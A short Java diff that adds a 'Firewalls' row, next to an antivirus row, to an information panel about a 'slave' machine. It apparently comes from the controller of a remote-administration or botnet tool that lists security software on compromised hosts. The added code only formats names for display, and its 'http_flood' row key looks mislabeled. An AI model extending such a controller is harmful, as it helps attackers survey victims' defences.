@@ -162,5 +162,21 @@ public class PanelControlComputerInfo extends PanelControlParent {
 		}
 		
 		addRow("antivirus", "Antiviruses", antiviruses);
+		
+		String firewalls = "";
+		
+		if (slave.getFirewalls().length == 1) {
+			firewalls = slave.getFirewalls()[0].getName();
+		} else {
+			for (int i = 0; i < slave.getFirewalls().length; i++) {
+				if (i == slave.getFirewalls().length - 1) {
+					firewalls += slave.getFirewalls()[i].getName();
+				} else {
+					firewalls += slave.getFirewalls()[i].getName() + ", ";
+				}
+			}
+		}
+		
+		addRow("http_flood", "Firewalls", firewalls);
 	}
 }
